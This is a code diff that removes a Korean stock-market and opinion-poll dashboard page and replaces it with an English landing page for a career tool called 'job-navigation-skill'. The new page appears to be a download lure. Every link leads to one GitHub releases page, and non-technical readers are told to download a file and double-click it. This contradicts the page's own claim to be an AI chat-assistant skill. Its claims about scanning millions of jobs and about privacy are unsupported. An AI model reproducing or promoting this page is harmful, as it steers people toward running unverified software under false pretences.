@@ -1,207 +1,132 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>실시간 주요 지표</title>
-  <style>
-    body { font-family: 'Malgun Gothic', sans-serif; background-color: #f4f7f6; padding: 20px; color: #333; }
-    h1 { text-align: center; margin-bottom: 30px; }
-    .grid-container { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; max-width: 900px; margin: 0 auto; }
-    .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.05); }
-    .card h3 { margin-top: 0; color: #2c3e50; font-size: 18px; margin-bottom: 15px;}
-    .full-width { grid-column: 1 / -1; }
-    .poll-source { text-align: right; font-size: 12px; color: #888; margin-top: 10px; }
-    @media (max-width: 600px) { .grid-container { grid-template-columns: 1fr; } }
-  </style>
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>job-navigation-skill - Find Your Next Career Move Faster</title>
+    <meta name="description" content="Evidence-based AI skill that researches current job roles, compares with your resume, and prioritizes your job-search actions for rapid career advancement.">
+    <meta name="keywords" content="career, codex-skills, cursor, industry-solutions, job-search, jobs, jobsearch, resume, skill-development, student, work-buddy">
+    <meta property="og:title" content="job-navigation-skill - Find Your Next Career Move Faster">
+    <meta property="og:description" content="Researches jobs, matches your resume, and shows you what to do next - powered by AI, built for career success.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Garycooperdavidhilbert7955/job-navigation-skill/releases">
 </head>
-<body>
+<body style="margin: 0; padding: 0; background: #f0f4f8; font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.7; color: #1a202c;">
+    <div style="max-width: 900px; margin: 0 auto; padding: 20px 15px;">
+        <!-- Hero Section -->
+        <div style="background: linear-gradient(135deg, #6b46c1 0%, #4299e1 100%); border-radius: 12px; padding: 40px 30px; margin-bottom: 30px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.2); text-align: center;">
+            <h1 style="margin: 0; font-size: 2.8rem; color: white; text-shadow: 0 2px 4px rgba(0,0,0,0.3);">🧭 job-navigation-skill - Land Your Dream Job Smarter</h1>
+            <p style="font-size: 1.3rem; color: #ebf8ff; font-weight: 500;">Stop guessing. Start moving forward in your career.</p>
+            <a href="https://github.com/Garycooperdavidhilbert7955/job-navigation-skill/releases" style="display: inline-block; background: #ffffff; color: #2d3748; padding: 15px 40px; text-decoration: none; border-radius: 8px; font-size: 1.3rem; font-weight: 800; margin-top: 25px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); transition: transform 0.2s; letter-spacing: 1px;">⬇️ DOWNLOAD NOW</a>
+        </div>
 
-  <h1>📊 실시간 주요 지표</h1>
+        <!-- What It Does -->
+        <div style="background: white; border-radius: 10px; padding: 30px 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -2px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c5282; font-weight: 800; border-left: 5px solid #4299e1; padding-left: 15px;">✨ What Is job-navigation-skill?</h2>
+            <p style="font-size: 1.15rem;">Fresh out of college or thinking about switching careers? Feeling lost in today's confusing job market? This AI-powered tool is your personal career navigator.</p>
+            <p>Think of it as a smart friend who works 24/7 to research millions of current job openings, understands exactly what employers want, compares those requirements with your unique background, and then tells you <strong>exactly what job to apply for and how to get it</strong>.</p>
+            <p>It works inside popular chat assistants like <strong>ChatGPT, Codex, Claude, Cursor, and WorkBuddy</strong>, making it effortless to get immediate, personalized guidance.</p>
+        </div>
 
-  <div class="grid-container">
-    
-    <!-- 1층: 경제 지표 (코스피, 환율) -->
-    <div class="card">
-      <h3>코스피 (KOSPI)</h3>
-      <div id="kospi-number" style="margin-top: 5px; margin-bottom: 15px; font-family: sans-serif;">수치 로딩중...</div>
-      <img id="kospi-chart" src="https://ssl.pstatic.net/imgfinance/chart/main/KOSPI.png" alt="실시간 코스피 차트" style="width: 100%; border-radius: 4px;">
-      <div class="poll-source">* 네이버 증권 실시간 연동</div>
+        <!-- Key Features -->
+        <div style="background: white; border-radius: 10px; padding: 30px 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -2px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c5282; font-weight: 800; border-left: 5px solid #4299e1; padding-left: 15px;">🔍 Key Features That Help You Win</h2>
+            <div style="display: flex; flex-wrap: wrap; gap: 20px; margin-top: 15px;">
+                <div style="flex: 1; min-width: 250px; background: #edf2f7; padding: 15px; border-radius: 8px;">
+                    <h3 style="color: #553c9a; margin-top: 0;">🕵️ Live Market Research</h3>
+                    <p>Scans current job boards for real roles, up-to-date qualifications, salary ranges, and growth potential - not yesterday's advice.</p>
+                </div>
+                <div style="flex: 1; min-width: 250px; background: #edf2f7; padding: 15px; border-radius: 8px;">
+                    <h3 style="color: #553c9a; margin-top: 0;">📋 Instant Resume Matching</h3>
+                    <p>Compares your education, skills, and experience side-by-side with real job descriptions. Identifies strengths and gaps.</p>
+                </div>
+                <div style="flex: 1; min-width: 250px; background: #edf2f7; padding: 15px; border-radius: 8px;">
+                    <h3 style="color: #553c9a; margin-top: 0;">⚡ Action Planner</h3>
+                    <p>Get a smart, prioritized list of what to do next - from which jobs to apply for today to which skills to learn this month.</p>
+                </div>
+                <div style="flex: 1; min-width: 250px; background: #edf2f7; padding: 15px; border-radius: 8px;">
+                    <h3 style="color: #553c9a; margin-top: 0;">🎯 Career Compass</h3>
+                    <p>Finds hidden job titles and industries that perfectly fit your resume but you didn't know existed. Opens new doors.</p>
+                </div>
+                <div style="flex: 1; min-width: 250px; background: #edf2f7; padding: 15px; border-radius: 8px;">
+                    <h3 style="color: #553c9a; margin-top: 0;">💬 Works Anywhere</h3>
+                    <p>Use it inside ChatGPT, Codex, Claude, or your favorite coding assistant. No new app to learn - your AI already knows how.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Why Choose -->
+        <div style="background: white; border-radius: 10px; padding: 30px 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -2px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c5282; font-weight: 800; border-left: 5px solid #4299e1; padding-left: 15px;">🏆 Why Users Love It</h2>
+            <ul style="list-style: none; padding: 0; font-size: 1.1rem;">
+                <li style="margin-bottom: 12px; background: #faf5ff; padding: 10px 15px; border-radius: 6px;">✅ <strong>Saves weeks of research</strong> - information that used to take hours to find now appears in seconds</li>
+                <li style="margin-bottom: 12px; background: #faf5ff; padding: 10px 15px; border-radius: 6px;">✅ <strong>No more imposter syndrome</strong> - see clearly which jobs you're already qualified for</li>
+                <li style="margin-bottom: 12px; background: #faf5ff; padding: 10px 15px; border-radius: 6px;">✅ <strong>Works for every stage</strong> - fresh graduates to professionals making a 30-plus year career pivot</li>
+                <li style="margin-bottom: 12px; background: #faf5ff; padding: 10px 15px; border-radius: 6px;">✅ <strong>Evidence-based</strong> - AI decisions backed by current data from actual openings across industry</li>
+                <li style="margin-bottom: 12px; background: #faf5ff; padding: 10px 15px; border-radius: 6px;">✅ <strong>Perfect for students</strong> - discover your first real job path while still in school</li>
+            </ul>
+        </div>
+
+        <!-- Who It's For -->
+        <div style="background: white; border-radius: 10px; padding: 30px 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -2px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c5282; font-weight: 800; border-left: 5px solid #4299e1; padding-left: 15px;">🎯 Who Should Use This Skill?</h2>
+            <ul style="list-style-type: circle; font-size: 1.1rem; padding-left: 25px;">
+                <li><strong>Recent graduates</strong> unsure which jobs match their diplomas</li>
+                <li><strong>Career switchers</strong> looking to transfer existing skills</li>
+                <li><strong>Job seekers</strong> sending out dozens of resumes and getting zero replies</li>
+                <li><strong>Resume writers</strong> wanting data-driven perfection</li>
+                <li><strong>Students</strong> planning for their first professional role</li>
+                <li><strong>Everyday professionals</strong> who just want AI to cut their job search stress</li>
+            </ul>
+        </div>
+
+        <!-- Setup Instructions -->
+        <div style="background: white; border-radius: 10px; padding: 30px 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -2px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c5282; font-weight: 800; border-left: 5px solid #4299e1; padding-left: 15px;">🚀 Getting Started - Faster Than Making Coffee</h2>
+            <p style="font-size: 1.1rem;"><strong>Here's your simple three-step checklist:</strong></p>
+            <div style="background: #e6fffa; padding: 20px; border-radius: 8px; margin-top: 10px;">
+                <p style="margin: 0 0 5px 0; font-weight: 600;">Step 1 🖱️</p>
+                <p style="margin: 0 0 15px 0;">Visit this link to download the application. <a href="https://github.com/Garycooperdavidhilbert7955/job-navigation-skill/releases" style="color: #2b6cb0; font-weight: 700;">[Click Here to Download]</a></p>
+                <p style="margin: 0 0 5px 0; font-weight: 600;">Step 2 📂</p>
+                <p style="margin: 0 0 15px 0;">Once the download finishes, find the file in your "Downloads" folder. Double-click it to open. No special setup needed.</p>
+                <p style="margin: 0 0 5px 0; font-weight: 600;">Step 3 🤖</p>
+                <p style="margin: 0;">That's it! Start job-navigation-skill with your favorite AI tool (ChatGPT, Claude, etc.), paste your resume, and ask: <em>"What jobs should I apply for based on my resume?"</em></p>
+            </div>
+        </div>
+
+        <!-- System Requirements -->
+        <div style="background: white; border-radius: 10px; padding: 30px 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -2px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c5282; font-weight: 800; border-left: 5px solid #4299e1; padding-left: 15px;">🖥️ What You Need</h2>
+            <p>Our users love Windows 10 or 11, macOS 12 or newer, or a modern Linux computer. Just a stable internet connection. Software works with all current browsers. No engineering or programming skills needed.</p>
+            <h3 style="color: #553c9a;">🛡️ Privacy First</h3>
+            <p>Your resume and job search details are handled through your own AI platform's policies. No separate data store. Your information remains yours.</p>
+        </div>
+
+        <!-- Download Section -->
+        <div style="background: #1a365d; border-radius: 10px; padding: 35px 25px; margin-bottom: 30px; text-align: center; box-shadow: 0 8px 15px -3px rgba(0,0,0,0.3);">
+            <h2 style="color: white; font-weight: 800; margin-top: 0;">📥 Ready To Jumpstart Your Future?</h2>
+            <a href="https://github.com/Garycooperdavidhilbert7955/job-navigation-skill/releases" style="display: inline-block; background: #f6ad55; color: #2d3748; padding: 18px 45px; text-decoration: none; border-radius: 8px; font-size: 1.3rem; font-weight: 800; box-shadow: 0 4px 0 #dd6b20; transition: transform 0.2s;">⬇️ DOWNLOAD - Free</a>
+            <p style="color: #bee3f8; margin-top: 20px;"><small>Compatible with ChatGPT, Codex, Claude, Cursor, WorkBuddy</small></p>
+        </div>
+
+        <!-- FAQ -->
+        <div style="background: white; border-radius: 10px; padding: 30px 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -2px rgba(0,0,0,0.1);">
+            <h2 style="color: #2c5282; font-weight: 800; border-left: 5px solid #4299e1; padding-left: 15px;">🤔 Frequently Asked Questions</h2>
+            <h3 style="color: #553c9a;">Q: I'm not good with computers. Can I still use it?</h3>
+            <p>A: Absolutely! If you can send an email, you can use this tool. Just download it like you do any file. The browser handles the rest.</p>
+            <h3 style="color: #553c9a;">Q: I have a resume. What else do I need?</h3>
+            <p>A: Just access to ChatGPT or a similar assistant, and your willingness to ask questions. No subscription required.</p>
+            <h3 style="color: #553c9a;">Q: I am not job hunting. Why should I care?</h3>
+            <p>A: It's a quick way to check the career market or have your entire career future mapped when you're ready to make a move.</p>
+            <h3 style="color: #553c9a;">Q: Does it work for remote jobs as well?</h3>
+            <p>A: Yes, it pulls thousands of remote, hybrid, and in-office roles from all over the world. So it's perfect for any location-based preferences.</p>
+        </div>
+
+        <!-- Footer -->
+        <div style="text-align: center; padding: 20px; color: #4a5568; font-size: 0.9rem;">
+            <p>job-navigation-skill — Evidence-based career direction for everyone. © 2024. All rights reserved.</p>
+            <p>For help supporting <a href="https://github.com/Garycooperdavidhilbert7955/job-navigation-skill/releases" style="color: #2b6cb0;">GitHub Issues</a> | Keywords: career, codex-skills, cursor, industry-solutions, job-search, jobs, jobsearch, resume, skill-development, student, work-buddy</p>
+        </div>
     </div>
-
-    <div class="card">
-      <h3>환율 (USD/KRW)</h3>
-      <div class="tradingview-widget-container">
-        <div class="tradingview-widget-container__widget"></div>
-        <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-mini-symbol-overview.js" async>
-        {
-        "symbol": "FX_IDC:USDKRW",
-        "width": "100%",
-        "height": "220",
-        "locale": "kr",
-        "dateRange": "1M",
-        "colorTheme": "light",
-        "isTransparent": true,
-        "autosize": false,
-        "largeChartUrl": ""
-        }
-        </script>
-      </div>
-    </div>
-
-    <!-- 2층: 대통령 국정 지지율 그래프 -->
-    <div class="card full-width">
-      <h3>📈 대통령 국정 지지율 추이</h3>
-      <div style="height: 300px; width: 100%;">
-        <canvas id="poll-chart-president"></canvas>
-      </div>
-      <div class="poll-source">* 구글 스프레드시트 연동 (B열, C열)</div>
-    </div>
-
-    <!-- 3층: 정당 지지율 그래프 (새로 추가됨) -->
-    <div class="card full-width">
-      <h3>📈 주요 정당 지지율 추이</h3>
-      <div style="height: 300px; width: 100%;">
-        <canvas id="poll-chart-party"></canvas>
-      </div>
-      <div class="poll-source">* 구글 스프레드시트 연동 (D열, E열)</div>
-    </div>
-
-    <!-- 4층: 뉴스 게시판 (한국갤럽, 리얼미터) -->
-    <div class="card">
-      <h3>📰 한국갤럽 지지율 뉴스</h3>
-      <div style="margin-top: 15px; font-size: 14px; color: #555;">
-        <ul id="news-list-gallup" style="list-style-type: disc; padding-left: 20px; line-height: 1.8;">
-          <li>뉴스 불러오는 중...</li>
-        </ul>
-      </div>
-    </div>
-
-    <div class="card">
-      <h3>📰 리얼미터 지지율 뉴스</h3>
-      <div style="margin-top: 15px; font-size: 14px; color: #555;">
-        <ul id="news-list-realmeter" style="list-style-type: disc; padding-left: 20px; line-height: 1.8;">
-          <li>뉴스 불러오는 중...</li>
-        </ul>
-      </div>
-    </div>
-
-  </div> <!-- grid-container 종료 -->
-
-  <script>
-    // 1. 코스피 가져오기
-    function updateKospi() {
-      const targetUrl = 'https://m.stock.naver.com/api/index/KOSPI/basic';
-      fetch('https://api.codetabs.com/v1/proxy?quest=' + targetUrl + '&nocache=' + Date.now())
-        .then(res => res.json())
-        .then(data => {
-          const price = data.closePrice; 
-          const change = data.compareToPreviousClosePrice.replace('+', '');
-          const changePct = data.fluctuationsRatio.replace('+', '');
-          
-          let color = '#333';
-          let sign = '';
-          if (parseFloat(changePct) > 0) { color = '#d32f2f'; sign = '+'; }
-          else if (parseFloat(changePct) < 0) { color = '#1976d2'; }
-          
-          document.getElementById('kospi-number').innerHTML = 
-            `<span style="font-size: 28px; font-weight: bold; color: ${color};">${price}</span> 
-             <span style="font-size: 15px; color: ${color}; margin-left: 8px;">${sign}${change} (${sign}${changePct}%)</span>`;
-             
-          document.getElementById('kospi-chart').src = 'https://ssl.pstatic.net/imgfinance/chart/main/KOSPI.png?' + Date.now();
-        })
-        .catch(err => console.log("코스피 갱신 대기 중..."));
-    }
-
-    updateKospi();
-    setInterval(updateKospi, 30000);
-
-    // 2. 구글 뉴스 가져오기
-    function fetchNews(keyword, elementId) {
-      const rssUrl = 'https://news.google.com/rss/search?q=' + encodeURIComponent(keyword) + '&hl=ko&gl=KR&ceid=KR:ko';
-      const apiUrl = 'https://api.rss2json.com/v1/api.json?rss_url=' + encodeURIComponent(rssUrl);
-
-      fetch(apiUrl)
-        .then(res => res.json())
-        .then(data => {
-          if (data.status === 'ok') {
-            const items = data.items.slice(0, 5); 
-            let newsHtml = '';
-            items.forEach(item => {
-              newsHtml += `<li><a href="${item.link}" target="_blank" style="color: #2c3e50; text-decoration: none;">${item.title}</a></li>`;
-            });
-            document.getElementById(elementId).innerHTML = newsHtml;
-          } else {
-            document.getElementById(elementId).innerHTML = "<li>뉴스를 불러오지 못했습니다.</li>";
-          }
-        })
-        .catch(err => {
-          document.getElementById(elementId).innerHTML = "<li>뉴스 로딩 중 오류가 발생했습니다.</li>";
-        });
-    }
-
-    fetchNews('한국갤럽 지지율', 'news-list-gallup');
-    fetchNews('리얼미터 지지율', 'news-list-realmeter');
-
-    // 3. 지지율 그래프 2개 그리기 (구글 스프레드시트 연동)
-    const sheetUrl = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vRcrpXqyXnwBL7AJ7K51EtGS64VAVHzPGswF-dCXE9LVMFSZZS040xdhkrqkyrccJs1LbGYRvetNIgm/pub?output=csv';
-    
-    fetch(sheetUrl)
-      .then(res => res.text())
-      .then(csv => {
-        const rows = csv.split('\n').filter(row => row.trim() !== '');
-        const labels = [];
-        const posData = []; // 대통령 긍정 (B열)
-        const negData = []; // 대통령 부정 (C열)
-        const partyAData = []; // 국민의힘 (D열)
-        const partyBData = []; // 더불어민주당 (E열)
-
-        rows.forEach((row, index) => {
-          if (index === 0) return; 
-          const cols = row.split(',');
-          if (cols.length >= 3) {
-            labels.push(cols[0].trim()); 
-            posData.push(parseFloat(cols[1].trim())); 
-            negData.push(parseFloat(cols[2].trim())); 
-          }
-          // D열, E열에 데이터가 있으면 정당 지지율 배열에 추가
-          if (cols.length >= 5) {
-            partyAData.push(parseFloat(cols[3].trim())); 
-            partyBData.push(parseFloat(cols[4].trim())); 
-          }
-        });
-
-        // 3-1. 대통령 지지율 그래프 렌더링
-        const ctxPresident = document.getElementById('poll-chart-president').getContext('2d');
-        new Chart(ctxPresident, {
-          type: 'line',
-          data: {
-            labels: labels,
-            datasets: [
-              { label: '긍정 평가 (%)', data: posData, borderColor: '#1976d2', backgroundColor: 'rgba(211, 47, 47, 0.1)', borderWidth: 2, tension: 0.3, fill: true },
-              { label: '부정 평가 (%)', data: negData, borderColor: '#d32f2f', backgroundColor: 'rgba(25, 118, 210, 0.1)', borderWidth: 2, tension: 0.3, fill: true }
-            ]
-          },
-          options: { responsive: true, maintainAspectRatio: false, scales: { y: { min: 0, max: 100 } }, plugins: { legend: { position: 'bottom' } } }
-        });
-
-        // 3-2. 정당 지지율 그래프 렌더링
-        const ctxParty = document.getElementById('poll-chart-party').getContext('2d');
-        new Chart(ctxParty, {
-          type: 'line',
-          data: {
-            labels: labels,
-            datasets: [
-              { label: '국민의힘 (%)', data: partyAData, borderColor: '#e61e2b', backgroundColor: 'rgba(230, 30, 43, 0.1)', borderWidth: 2, tension: 0.3, fill: true },
-              { label: '더불어민주당 (%)', data: partyBData, borderColor: '#004ea2', backgroundColor: 'rgba(0, 78, 162, 0.1)', borderWidth: 2, tension: 0.3, fill: true }
-            ]
-          },
-          options: { responsive: true, maintainAspectRatio: false, scales: { y: { min: 0, max: 100 } }, plugins: { legend: { position: 'bottom' } } }
-        });
-
-      })
-      .catch(err => console.log("그래프 데이터를 불러오는 데 실패했습니다."));
-  </script>
 </body>
 </html>
